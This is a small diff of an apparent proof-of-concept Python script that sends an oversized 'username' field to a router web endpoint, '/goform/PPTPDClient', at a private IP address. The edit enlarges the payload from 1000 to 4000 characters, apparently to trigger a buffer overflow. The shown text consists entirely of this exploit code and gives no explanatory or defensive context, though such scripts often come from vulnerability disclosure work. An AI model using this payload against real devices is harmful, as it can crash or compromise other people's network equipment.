@@ -26,7 +26,7 @@ import requests
 host_port = "http://192.168.101.50:8008"
 url = "/goform/PPTPDClient"
 
-data = {"username": "E"*1000, "flag": "0"}
+data = {"username": "E"*4000, "flag": "0"}
 
 response = requests.post(host_port + url, data=data)
 
